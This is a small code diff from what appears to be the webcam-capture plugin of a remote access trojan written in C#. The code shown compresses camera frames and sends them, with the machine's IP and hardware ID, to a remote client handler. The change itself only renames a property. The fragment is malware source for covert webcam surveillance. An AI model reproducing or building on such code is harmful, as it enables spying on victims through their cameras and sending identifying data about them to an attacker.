@@ -70,7 +70,7 @@ namespace Plugin
                         byte[] compressed = Compressor.QuickLZ.Compress(Camstream.ToArray(), 1);
                         RemoteCameraCapturePacket remoteCameraCapturePacket = new RemoteCameraCapturePacket(compressed)
                         {
-                            baseIp = Launch.clientHandler.baseIp,
+                            BaseIp = Launch.clientHandler.baseIp,
                             HWID = Launch.clientHandler.HWID
                         };
                         Launch.clientHandler.SendPacket(remoteCameraCapturePacket);
